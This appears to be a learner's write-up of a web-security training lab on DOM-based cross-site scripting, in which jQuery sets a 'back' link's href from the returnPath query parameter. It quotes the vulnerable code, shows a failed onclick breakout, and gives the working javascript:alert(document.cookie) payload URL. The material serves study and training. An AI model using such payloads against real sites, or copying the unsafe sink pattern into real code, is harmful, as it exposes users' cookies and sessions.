# Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

 >This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

>To solve this lab, make the "back" link alert document.cookie. 

Vulnerable area: Submit feedback page

Found this jQuery code on the page:


`$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});`

Based on the code, we can modify where the `back` link takes the user by modifying the `returnPath` url parameter

I tried many variations of escaping the href attribute and injecting some onclick js, but it didn't work... Example:

`https://ace81f591f9bbb03c0e51e9b00900066.web-security-academy.net/feedback?returnPath=%22%20onclick=%22alert(document.cookie)`

Result of above:
`<a id="backLink" href=""; onclick="alert(document.cookie)">Back</a>`

### Solution
Solved lab with the following payload:

`https://ace81f591f9bbb03c0e51e9b00900066.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)`


